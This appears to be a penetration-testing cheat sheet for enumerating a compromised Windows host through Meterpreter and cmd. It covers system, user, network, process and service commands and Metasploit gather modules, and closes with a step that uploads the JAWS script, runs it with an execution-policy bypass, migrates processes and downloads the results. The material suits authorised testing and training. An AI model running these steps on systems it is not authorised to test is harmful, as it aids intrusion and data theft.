# Windows local enumeration

## Enumerating system information

```text
meterpreter > sysinfo
meterpreter > shell
C:\>systeminfo
```

## Enumerating all windows updates patches on the system

```text
C:\>wmic qfe get Caption,Description,HotFixID,Installation
```

## Enumerating users & groups

```text
meterpreter > getuid
meterpreter > getprivs
```

```text
meterpreter > shell
C:\>whoami
C:\>whoami /priv
C:\>query user
C:\>net users
C:\>net user administrator
C:\>net localgroup
C:\>net localgroup administrators
```

```text
meterpreter > background
msf6 > use post/windows/gather/enum_logged_on_users
msf6 > sessions
msf6 > set SESSION 1
msf6 > run
```

## Enumerating network information

```text
meterpreter > arp
meterpreter > getproxy
meterpreter > ifconfig
meterpreter > netstat
meterpreter > portfwd
meterpreter > resolve
meterpreter > route
```

```text
C:\>ipconfig
C:\>ipconfig /all
C:\>route print
C:\>arp -a
C:\>netstat -ano
C:\>netsh firewall show state
C:\>netsh firewall show state
```

## Enumerating processes & services

```text
meterpreter > ps
meterpreter > pgrep explorer.exe
meterpreter > migrate 2176
```

```text
meterpreter > shell
C:\>net start
C:\>wmic service list brief
C:\>tasklist /SVC
C:\>schtasks /query /fo LIST
```

## Enumerating disks

```text
meterpreter > show_mount
```

## Automating windows local enumeration

### With Metasploit

```text
msf6 > use post/windows/gather/win_privs
msf6 > use post/windows/gather/enum_logged_on_users
msf6 > use post/windows/gather/checkvm
msf6 > use post/windows/gather/enum_applications
msf6 > use post/windows/gather/enum_computers
msf6 > use post/windows/gather/enum_patches
msf6 > use post/windows/gather/enum_shares
```

### With Just Another Windows enum script (JAWS)

```text
:~# git clone https://github.com/411Hall/JAWS.git
meterpreter > cd C:\\
meterpreter > mkdir Temp && cd Temp
meterpreter > upload /root/jaws-enum.ps1
meterpreter > shell
C:\Temp>powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Results.txt
C:\Temp>^C
meterpreter > download JAWS-Results.txt
```
